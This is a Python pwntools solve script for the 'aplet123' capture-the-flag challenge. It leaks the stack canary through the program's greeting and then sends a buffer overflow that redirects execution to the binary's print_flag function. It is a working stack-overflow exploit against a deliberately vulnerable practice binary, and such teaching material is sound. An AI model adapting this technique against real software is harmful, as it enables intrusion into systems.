#!/usr/bin/env python3

from pwn import *

exe = ELF("./aplet123_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31123)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

r.sendlineafter(b'hello\n', b'A' * (0x48 - 3) + b"i'm")
r.recvuntil(b'hi ')
canary = u64(b'\0' + r.recv(7))
log.info(f'{hex(canary)=}')

pl = b'A' * 0x48
pl += p64(canary)
pl += b'B' * 8
pl += p64(exe.symbols.print_flag)
r.sendlineafter(b'aplet123\n', pl)
r.sendline(b'bye')

r.interactive()
